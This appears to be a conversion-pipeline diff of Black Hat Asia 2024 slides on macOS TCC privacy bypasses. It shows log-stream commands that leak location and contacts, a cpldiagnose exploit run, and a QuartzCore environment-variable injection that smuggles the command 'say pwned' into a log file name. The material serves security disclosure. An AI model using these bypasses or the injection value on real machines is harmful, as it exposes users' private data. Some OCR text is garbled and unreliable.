@@ -8,19 +8,25 @@ year: 2024
 source_pdf: "BlackHat ASIA 2024-Slides/Csaba Fitzl & Wojciech Reguła-The Final Chapter Unlimited ways to bypass your macOS privacy mechanisms.pdf"
 pages: 68
 sha256: "7bd3c9dbe1bd9281528a4ed0721275dd3cd32a74cdf4cfaa4a5582dcd689360e"
-text_chars: 26121
-ocr_pages: 25
+text_chars: 23547
+ocr_pages: 22
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 84.4
+ocr_unreliable_blocks: 0
+vision_verified_blocks: 3
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-12T00:49:26Z"
+converted_at: "2026-08-12T04:47:51Z"
 ---
 # The Final Chapter Unlimited ways to bypass your macOS privacy mechanisms
 
 **Speakers:** Csaba Fitzl, Wojciech Reguła  
 **Conference:** Black Hat ASIA 2024  
 **Source:** `BlackHat ASIA 2024-Slides/Csaba Fitzl & Wojciech Reguła-The Final Chapter Unlimited ways to bypass your macOS privacy mechanisms.pdf` (68 pages)
+
 
 ## Slide 1
 
@@ -31,16 +37,6 @@ UNLIMITED WAYS TO BYPASS YOUR MACOS PRIVACY MECHANISMS
 CSABA FITZL & WOJCIECH REGUŁA
 
 #BHASIA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-Gen 2024 — *
-THE FINAL* CHAPTER
-UNLIMITED WAYS TO BYPASS YOUR MACOS PRIVACY MECHANISMS
-CSABA FITZL & WOJCIECH REGULA
-#BHASIA @BlackHatEvents
-```
 
 ## Slide 2
 
@@ -78,14 +74,10 @@ CSABA FITZL & WOJCIECH REGULA
 
 # BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-black hat ee Ze
-ASIA 2024
-Backia pifeachat
-AUgUSE 4-5, 2021 EUR@GBRE ae
-DECEMBER 7-Sieo-—
 BRIEFINGS
 of s Knockout win against TCC, a.k.a. 20+ NEW ways to
 Privacy Mechanisms bypass your macOS privacy mechanisms
@@ -132,17 +124,6 @@ OpenAI: generate Polish and Hungarian grilling an apple
 
 # BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-pisek hat
-ASIA 2024
-TCC / privacy fundamentals
-~ -
-“STA - = ner
-}
-```
-
 ## Slide 7
 
 ## TCC / Privacy fundamentals
@@ -181,32 +162,16 @@ The number of protected resources still increases…
 
 # BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-2)
-black hat
-ASIA 2024
-TCC / Privacy fundamentals
-The number of protected : : : :
-resources still 2 5 : » < > < ¥
-increases... f oO °
-Cane es
-GOCE ae
-```
-
 ## Slide 10
 
 ## TCC / Privacy fundamentals
 
 # BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2024
 TCC / Privacy fundamentals
 Eg Screen Time
 General
@@ -231,19 +196,15 @@ Reminders
 &J Bluetooth
 Microphone
 Camera
-Homekit
 Speech Recognition
 provide access to documents and data in those applications, and to
-3] g < Automation
 Q Allow the applications below to control other applications. This will
 EJ Screen Time perform actions with them.
 General v Oo iTerm
 Appearance
 ©) PP Finder
-\@) Accessibility
 System Events
 Control Centre
-ae . Hopper Disassembler
 =) Siri & Spotlight
 > 6 Terminal
 Desktop & Dock > &. vic
@@ -316,22 +277,18 @@ CVE-2023-40395
 
 # BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2024
 Notable log info leaks
 ° CVE-2023-23505 - ScreenTimeCore
-@
 ~ % log show --predicate --last
 1d
 the log data using Updated com.apple.MobileSMS context for handle
 info and debug messages, pass --info and/or --debug to include.
 Thread Type Activity PID TTL
 13:21:51.055084+0100 0x296658 Default 0x0 590 0 suggestd:
-[com.apple.ScreenTimeAgent: conversation] Updated com.apple.MobileSMS context for handles: (
 General policy: ©. While Limited policy: 0. allowedByScreenTime:1 applicationCurrentlyLimited:0
 shouldBeAllowedByScreenTimeWhenLimited:1 emergencyModeEnabled:0 allowedByContactsHandle: {
 =1;
@@ -345,29 +302,34 @@ shouldBeAllowedByScreenTimeWhenLimited:1 emergencyModeEnabled:0 allowedByContact
 
 # BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 79/100 on the text kept, 75/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-2)
-black hat
-ASIA 2024
 Notable log info leaks
-¢ CVE-2023-40405 — Maps — distance to location, can geolocate the user!
-iser@ ~ % r --info --debug --process Maps -predicate “eventMessage contains[c] ‘Distance to
-destination'"
-"pr BEGIN TH[cd] N te | age CON to
-T Type
-2023-04-25 14:00:04.228534+0200 0x39c436 Fc 0x0 71081 0 I 5 )
-2023-04-25 14:00:05.236340+0200 0x39c494 0x0 71081 0 ps: ( € )
-2023-04-25 14:00:26.143974+0200 0x39c436 0x0 71081 0 | A y- )
-[com. F :GEOI ‘ f ] dist to 1 1 is 20605.0
-2023-04-25 14:00:27.139254+0200 0x39c620 0x0 71081 0 2 (( V )
-2023-04-25 14:00:27.230583+0200 0x39c436 0x0 71081 0 5 (( > )
-2023-04-25 14:00:27.233670+0200 0x39c436 0x0 71081 0 A es)
-[ -apple. :GEOIdea s pe ] : e to « 1 is 20605.0
-2023-04-25 14:00:27.234651+0200 0x39c436 0x0 71081 0 | > (Ge i )
-[ 5 Hi ervices :GEOIdez I ] t to ion 1 is 20605.0
-2023-04-25 14:00:27.237433+0200 0x39c436 0x0 71081 0 I 5 ; )
+
+• CVE-2023-40405 – Maps – distance to location, can geolocate the user!
+
+user@mac ~ % log stream --info --debug --process Maps -predicate "eventMessage contains[c] 'Distance to destination'"
+
+Filtering the log data using "process BEGINSWITH[cd] "Maps" AND composedMessage CONTAINS[c] "Distance to destination""
+Timestamp                          Thread     Type      Activity              PID    TTL
+2023-04-25 14:00:04.228534+0200 0x39c436   Info      0x0                   71081  0    Maps: (GeoServices)
+[com.apple.GeoServices:GEOIdealTransportTypeFinder]   Distance to destination 1 is 17135.6 meters
+2023-04-25 14:00:05.236340+0200 0x39c494   Info      0x0                   71081  0    Maps: (GeoServices)
+[com.apple.GeoServices:GEOIdealTransportTypeFinder]   Distance to destination 1 is 15507.5 meters
+2023-04-25 14:00:26.143974+0200 0x39c436   Info      0x0                   71081  0    Maps: (GeoServices)
+[com.apple.GeoServices:GEOIdealTransportTypeFinder]   Distance to destination 1 is 20605.0 meters
+2023-04-25 14:00:27.139254+0200 0x39c620   Info      0x0                   71081  0    Maps: (GeoServices)
+[com.apple.GeoServices:GEOIdealTransportTypeFinder]   Distance to destination 1 is 15507.5 meters
+2023-04-25 14:00:27.230583+0200 0x39c436   Info      0x0                   71081  0    Maps: (GeoServices)
+[com.apple.GeoServices:GEOIdealTransportTypeFinder]   Distance to destination 1 is 20605.0 meters
+2023-04-25 14:00:27.233670+0200 0x39c436   Info      0x0                   71081  0    Maps: (GeoServices)
+[com.apple.GeoServices:GEOIdealTransportTypeFinder]   Distance to destination 1 is 20605.0 meters
+2023-04-25 14:00:27.234651+0200 0x39c436   Info      0x0                   71081  0    Maps: (GeoServices)
+[com.apple.GeoServices:GEOIdealTransportTypeFinder]   Distance to destination 1 is 20605.0 meters
+2023-04-25 14:00:27.237433+0200 0x39c436   Info      0x0                   71081  0    Maps: (GeoServices)
+[com.apple.GeoServices:GEOIdealTransportTypeFinder]   Distance to destination 1 is 20605.0 meters
 2023
 ```
 
@@ -393,29 +355,29 @@ T Type
 
 # BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 84/100 on the text kept, 82/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-2)
-black hat
-ASIA 2024
 TCC bypasses via info leaks
-¢ CVE-2023-32415 — open Weather && break Internet connection == profit ©
-WeatherWidget (WeatherKit)
-Subsystem: com.apple.weather Category: WeatherService 2023-04-07 02:03:42.689661+0200
-Encountered an error when fetching weather data subset; location=<mask.hash: '4JbJ9yyCEw5831VbmMX+r. >, error=networkError(Error Domain=NSURLErrorDomain Code=-1009 "The
-internet connection appears to be offline." UserInfo={_kCFStreamErrorCodeKey=5@, NSUnderlyingError=0x7fd9db21d87@ {Error Domain=kCFErrorDomainCFNetwork Code=-1009 "(null)"
-UserInfo={_NSURLErrorNwPathKey=satisfiable (Network Agent [domain: NetworkExtension, type: VPN, description: VPN: NordVPN NordLynx, uuid: B8018612—7A83-4C6B-9D8F-DC8C@F565CF1,
-flags: 9] is unsatisfied), interface: utun3, ipv4, dns, _kCFStreamErrorCodeKey=5@, _kCFStreamErrorDomainKey=1}}, _NSURLErrorFailingURLSessionTaskErrorKey=LocalDataTask
-<1B74015D-B8CF-436F-B8@F-B58FC5F1346C>.<12>, _NSURLErrorRelatedURLSessionTaskErrorKey=(
-"LocalDataTask <1B74015D-B8CF—436F—B8@F—-B58FC5F1346C>. <12>"
-), NSLocalizedDescription=The internet connection appears to be offline., NSErrorFailingURLStringKey=https://weather-data.apple.com/v3/weather/en-PL/5@! /18. q
-timezone=Europe/
-Warsaw&dataSets=currentWeather, forecastNextHour, forecastHourly, forecastDaily weatherAlerts. airQualitv&hourlvStart=2023-94-96123:56:12Z&hour lyEnd=2023-04-077 23: 56 :12Z&country=PL&
-treatmentIdentifiers=1654130767827 , 1663285968257&clientMetadata=( , NSErrorFailingURLKey=https://weather-
-data.apple.com/v3/weather/en-PL/5@: 7?timezone=Europe/
-Warsaw&dataSets=currentWeather, forecastNextHour, forecastHourly, forecastDaily, weatherAlerts, airQualitv&hourlyStart=2023-04-06123:56:12Z&hourlyEnd=2023-04-07T 23: 56 :12Z&country=PL&
-treatmentIdentifiers=1654130767827 , 1663285968257&clientMetadata=( , _kCFStreamErrorDomainKey=1})
+
+• CVE-2023-32415 – open Weather && break Internet connection == profit 😂
+
+WeatherWidget (WeatherKit)                                                              ERROR
+Subsystem: com.apple.weather  Category: WeatherService  Details          2023-04-07 02:03:42.689661+0200
+
+Encountered an error when fetching weather data subset; location=<mask.hash: '4JbJ9yyCEw583lVbmMX+rA=='>,  error=networkError(Error Domain=NSURLErrorDomain Code=-1009 "The
+internet connection appears to be offline." UserInfo={_kCFStreamErrorCodeKey=50, NSUnderlyingError=0x7fd9db21d870 {Error Domain=kCFErrorDomainCFNetwork Code=-1009 "(null)"
+UserInfo={_NSURLErrorNWPathKey=satisfiable (Network Agent [domain: NetworkExtension, type: VPN, description: VPN: NordVPN NordLynx, uuid: B8018612-7A83-4C6B-9D8F-DC8C0F565CF1,
+flags: 9] is unsatisfied), interface: utun3, ipv4, dns, _kCFStreamErrorCodeKey=50, _kCFStreamErrorDomainKey=1}}, _NSURLErrorFailingURLSessionTaskErrorKey=LocalDataTask
+<1B74015D-B8CF-436F-B80F-B58FC5F1346C>.<12>, _NSURLErrorRelatedURLSessionTaskErrorKey=(
+    "LocalDataTask <1B74015D-B8CF-436F-B80F-B58FC5F1346C>.<12>"
+), NSLocalizedDescription=The internet connection appears to be offline., NSErrorFailingURLStringKey=https://weather-data.apple.com/v3/weather/en-PL/50.[obscured]/18.[obscured]?timezone=Europe/
+Warsaw&dataSets=currentWeather,forecastNextHour,forecastHourly,forecastDaily,weatherAlerts,airQuality&hourlyStart=2023-04-06T23:56:12Z&hourlyEnd=2023-04-07T23:56:12Z&country=PL&
+treatmentIdentifiers=1654130767827,1663285968257&clientMetadata=[obscured], NSErrorFailingURLKey=https://weather-
+data.apple.com/v3/weather/en-PL/50.[obscured]7?timezone=Europe/
+Warsaw&dataSets=currentWeather,forecastNextHour,forecastHourly,forecastDaily,weatherAlerts,airQuality&hourlyStart=2023-04-06T23:56:12Z&hourlyEnd=2023-04-07T23:56:12Z&country=PL&
+treatmentIdentifiers=1654130767827,1663285968257&clientMetadata=[obscured], _kCFStreamErrorDomainKey=1})
 ```
 
 ## Slide 19
@@ -426,15 +388,13 @@ treatmentIdentifiers=1654130767827 , 1663285968257&clientMetadata=( , _kCFStream
 
 # BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pisek hat
-ASIA 2024
 TCC bypasses via info leaks
 see wregula — wregula@Fliger — -zsh — 96x22
 log stream --debug --predicate 'process == "Messages" AND message contains "Email"' | grep \"
-¢ CVE-2023-41072
 contacts leak in
 iMessage
 ```
@@ -465,7 +425,8 @@ iMessage
 
 # BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Finder File Edit
@@ -539,10 +500,10 @@ Information
 
 # BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-a
 System Settings
 File Edit View Window
 Sign in
@@ -550,7 +511,6 @@ ey Wi-Fi
 GJ Bluetooth
 ks) Network
 Notifications
-J) Sound
 US Focus
 &¥ Screen Time
 General
@@ -565,7 +525,6 @@ Wallpaper
 Help G8 QQ & Jan13., Fri 18:53
 Files and Folders
 Allow the applications below to access files and folders.
-ia
 4 Terminal
 Downloads Folder
 ```
@@ -574,11 +533,10 @@ Downloads Folder
 
 # BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-‘ .
-@ = Terminal
 Direct
 @ extzij
 Shell
@@ -607,13 +565,11 @@ adding:
 adding:
 adding:
 adding:
-image@
 image1
 image2
 image3
 image4
 image5
-imageé
 image7
 image8
 image9
@@ -622,10 +578,6 @@ big
 -ipg
 -ipg
 -ipg
--ipg
--ipg
--jpg
-- jpg
 -ipg
 -ipg
 ./race.py
@@ -648,7 +600,6 @@ random files
 52%)
 52%)
 52%)
-Qng080e0e B=.
 ```
 
 ## Slide 27
@@ -667,9 +618,9 @@ Qng080e0e B=.
 
 - Meet
 
-```
+\```
 link_shared_support.bash
-```
+\```
 
 • Target TCC.db or `/Library/Apple/Library/Bun dles/TCC_Compatibility.bun dle/Contents/Resources/All owApplicationsList.plist`
 
@@ -679,14 +630,13 @@ link_shared_support.bash
 
 # BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 @ Terminal Shell Edit View Window Help Q S&S ThuOct5 11:51
-ee
 (@) ( © moose — -zsh — 99x25
 moose@max ~ %
-6°88O0° 520 Gat
 ```
 
 ## Slide 30
@@ -703,12 +653,10 @@ moose@max ~ %
 
 # BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2024
 TCC bypasses via cpldiagnose
 eee Macintosh HD — cpldiagnose — 124x17
 users-Virtual-Machine:~ root# /System/Library/PrivateFrameworks/CloudPhotoLibrary.framework/Versions/A/Support/cpldiagnose |=
@@ -731,12 +679,10 @@ Press ‘Enter' to continue. Ctrl+\ to cancel.
 
 # BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2024
 TCC bypasses via cpldiagnose
 ® user — bash — 128x28
 users-Virtual-Machine:~ root# /System/Library/PrivateFrameworks/CloudPhotoLibrary.framework/Versions/A/Support/cpldiagnose —-h
@@ -755,7 +701,6 @@ skip database copying. (-d for databases bigger than 5000 MB, -D always)
 annotate output file name (e.g. downloader), ignored if -o used.
 -1 <librarypath>
 copy information from the library at path.
-—p
 include legacy plists
 -j
 include recovery journals
@@ -781,12 +726,10 @@ use <uid> as the user id
 
 # BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2024
 TCC bypasses via cpldiagnose
 ee §& cpidiagnose — wregula@Fliger — ..C/cpidiagnose — -zsh — 84x21
 > sudo ./exploit.sh
@@ -850,29 +793,18 @@ It has a large attack surface for local attacks as it handles a lot of interesti
 
 # BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 76/100 on the text kept, 63/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2024
 TCC bypasses via QuartzCore framework
-r0 = geteny ;(“QUARTZCORE_LOG FILE");
-. getenv("X_LOG FILE");
 if (r®@ != Ox®) {
-r®@ = _x_set_log_filename(r@);
 }
 }
 else {
-r®@ = _x_set_log_filename(r@);
 }
 r®@ = atexit(@x1886efed@);
-*0x1dScbdf50 = os_log_create( 1) imati ie r™)}
 *O@x1d5cbdf68 = os_log_create( .a iat > Debug");
-*O@xid5cbdf70 = os_log_create(“com.apple.cc iat a L"):
-*Ox1dS5cbdf88 = os_log_create("com.apple.corea lation", "T al"):
-*Ox1idScbdf98 = os_log_create( 1 - penGL");
-*O@xidScbdfa8 = os_log_create( imati - nder™)s
 *O@xidS5cbhdfc@ = os loa createl it . }:
 ```
 
@@ -882,31 +814,21 @@ r®@ = atexit(@x1886efed@);
 
 # BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2024
 TCC bypasses via QuartzCore framework
-r28 = ®xid5cc00@0;
 if (getenv("X_LOG_ FILE_OPEN") != @x@) {
-r28 = Oxid5cc00@0;
 var_20 = 0x®@;
 ar_3® = ri9;
 r®@ = asprintf(&var_20, “open '%s'", r2);
 if ((r® & Oxffffffff80000000) == Ox) {
-r20 = O@xid5cc00e@0;
 var_30 = var_20;
-r@ = printf(" command: 7. seal I
-r®@ = system(var_28);
-r®@ = free(var_28@);
 }
 ri= opel
 r19 = *@x1d5cced20;
 }
-r® = free(ri9);
-*@xid5cc@d20 = @x®;
 ```
 
 ## Slide 40
@@ -917,29 +839,19 @@ This is OS command injection in all GUI macOS 😬 apps
 
 # BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 60/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pisek hat
-ASIA 2024
 TCC bypasses via QuartzCore framework
-r26 = @x1d5cc00@0;
 if (getenv("X_LOG_ FILE_OPEN") != @x@) {
-var_20 = 0x®@; 1 1
 Se ce This is OS
-r0 = asprintf(&var_28, “oper ro Eas
 command injection
-It TUro & UXT TTTTTTTOUOUUGGE) == OxBT 1
-r20 = O@xid5cc00e@0;
 a hago in all GUI macOS
-_aA-|, of * apps ©
 ro = tree(var_20);
 }
 ri = “opel
-ri9 = Ox1d5cc0d20;
 }
-r® = free(ri9);
-*Ox1d5cc0d20 = @x®@;
 ```
 
 ## Slide 41
@@ -962,14 +874,11 @@ r® = free(ri9);
 
 # BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2024
 TCC bypasses via QuartzCore framework
-@
 open com. apple. findmy QUARTZCORE_LOG_FILE="/Users/wregula/Library/Caches/LocationLoggerApp.app';say pwned ';" X_LOG_FILE_OPEN=1
 Process group (5)
 Process execution events in the same group as say will show in this unified table.
@@ -985,7 +894,8 @@ Timestamp Process name Signing ID Process path Command line
 
 # BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 /bin/sh — /bin/sh — 165x27
@@ -1017,14 +927,12 @@ Timestamp Process name Signing ID Process path Command line
 
 # BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 68/100 on the text kept, 51/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-@ g (user — -zsh— 100x25
 -zsh
 user@users-Virtual-Machine ~ % log stream --debug --predicate ‘subsystem == "com.apple.CFNetwork"'l}
-|
-SGOS8e8 080 °86~* F58FOR CH *U
 ```
 
 ## Slide 47
@@ -1033,12 +941,10 @@ SGOS8e8 080 °86~* F58FOR CH *U
 
 # BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2024
 TCC bypasses via CFNetwork
 12:13:26.944307+0200 Safari CFNetwork Diagnostics [3:104] 12:13:26.944 { Protocol Enqueue: request GET https://jira.
 Safari (CFNetwork)
@@ -1047,7 +953,6 @@ CFNetwork Diagnostics [3:104] 12:13:26.944 {
 Protocol Enqueue: request GET https://jira.! ’ apple-touch-icon.png HTTP/1.1
 Request: <NSMutableURLRequest: @x6000031c38e@> { URL: https://jira. ‘apple-touch-icon.png }
 Message: GET https://jira. apple-touch-icon.png HTTP/1.1
-Cookie: JSESSIONID=0 ); atlassian.xsrf.token=BURB—XNU5-5UBZ-02G5_7009d31d776f4017a68de58ce308b92678360d13_lout
 Accept: */x*
 Accept-Language: en-GB,en;q=0.9
 Accept-Encoding: gzip, deflate, br
@@ -1060,11 +965,10 @@ Accept-Encoding: gzip, deflate, br
 
 # BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pisek hat
-ASIA 2024
 12:03:33.867760+0200 CFNetwork Diagnostics [3:6] 12:03:33.867 { Protocol Enqueue: request GET https://weather-data.apple.com/v3/weather/en-PL/5@. (19.4 time!
 Maps (CFNetwork)
 Subsystem: com.apple.CFNetwork Category: Diagnostics Deta 2023-04-06 12:03:33.867760+0200
@@ -1076,7 +980,6 @@ User-Agent: WeatherKit_Maps_macOS_Version 13.2.1 (Build 22D68)
 Accept: */x
 Authorization:
 €
-f :
 Accept—Language: en-GB,en;
 Accept-Encoding: gzip, deflate, br
 } [3:6]
@@ -1088,33 +991,36 @@ Accept-Encoding: gzip, deflate, br
 
 # BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 87/100 on the text kept, 78/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-pigeachat ZA —
-ASIA 2024
 TCC bypasses via CFNetwork
-20:22:52.271080+0200 CFNetwork Diagnostics [3:5] 20:22:52.270 { Protocol Enqueue: request POST https://p131-fmipmobi
+
+20:22:52.271080+0200          FindMy                    CFNetwork Diagnostics [3:5] 20:22:52.270 {      Protocol Enqueue: request POST https://p131-fmipmobi
+
 FindMy (CFNetwork)
-Subsystem: com.apple.CFNetwork Category: Diagnostics Details 2023-04-06 20:22:52.271080+0200
+Subsystem: com.apple.CFNetwork  Category: Diagnostics  Details          2023-04-06 20:22:52.271080+0200
+
 CFNetwork Diagnostics [3:5] 20:22:52.270 {
-Protocol Enqueue: request POST https://p131-fmipmobile.icloud.com/fmipservice/device/§ /initClient HTTP/1.1
-Request: <NSMutableURLRequest: @x6@0000635940> { URL: https://p131-fmipmobile.icloud.com/fmipservice/device/ L/initClient }
-Message: POST https://p131-—fmipmobile.icloud.com/fmipservice/device/! /initClient HTTP/1.1
-Content-Type: application/json
+    Protocol Enqueue: request POST https://p131-fmipmobile.icloud.com/fmipservice/device/[obscured]/initClient HTTP/1.1
+        Request: <NSMutableURLRequest: 0x600000635940> { URL: https://p131-fmipmobile.icloud.com/fmipservice/device/[obscured]/initClient }
+        Message: POST https://p131-fmipmobile.icloud.com/fmipservice/device/[obscured]/initClient HTTP/1.1
+    Content-Type: application/json
 X-Apple-Realm-Support: 1.0
-X-Apple-I-MD-LU: AB73:
-Accept: application/json
-Authorization: Basic
-NTU@Nzc2Mjcx¢ ATBhSnJyakxYT1VVNj AxZXdaSy1qSzE@NTVha11BTmxXa@5CV1INYMTZ6QzRaNEtRZFdpc
-nRrNHVuQkF1U¢ }==
-X-Apple-I-MD-RINFO: 17106176
-X-MME-CLIENT-INFO: <MacBookPro16,2> <mac0S;13.2.1;22D68> <com.apple.AuthKit/1 (com.apple.findmy/310.3.1)>
-Accept-Encoding: gzip, deflate, br
-Accept—Language: en-GB, en; q=0.9
-X-Apple-I-MD-M: 8C3fQh <8DHqnsuhg/8kj
-Content-Length:
-X-Apple-Find-API-Ver:
+    X-Apple-I-MD-LU: AB73[obscured]
+        Accept: application/json
+    Authorization: Basic
+NTU0Nzc2MjcxO[obscured]MTBhSnJyakxYT1VVNjAxZXdaSy1qSzE0NTVha1lBTmxXa05CV1NYMTZ6QzRaNEtRZFdpc
+nRrNHVuQkF1U0[obscured]g==
+    X-Apple-I-MD-RINFO: 17106176
+    X-MME-CLIENT-INFO: <MacBookPro16,2> <macOS;13.2.1;22D68> <com.apple.AuthKit/1 (com.apple.findmy/310.3.1)>
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: en-GB,en;q=0.9
+    X-Apple-I-MD-M: 8C3fQh[obscured]:8DHqnsuhg/8kj
+    Content-Length: 360
+X-Apple-Find-API-Ver: 3.0
+X-Apple-I-Client-Time: 2023-04-06T18:22:51Z
 ```
 
 ## Slide 50
